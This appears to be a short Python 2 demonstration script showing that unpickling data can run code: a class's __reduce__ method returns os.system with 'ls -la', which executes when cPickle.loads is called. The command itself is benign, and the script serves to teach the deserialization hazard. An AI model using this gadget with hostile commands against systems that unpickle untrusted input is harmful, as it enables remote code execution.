#!/usr/bin/env python2

import cPickle, os

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("ls -la",))

print("Dumping pickle to string")
print("========================\n")

data = cPickle.dumps(SerializedPickle())
print(data + "\n")

print("Loading serialized string")
print("========================\n")

cPickle.loads(data)

print("\nDeserializing the data triggers the command to execute")
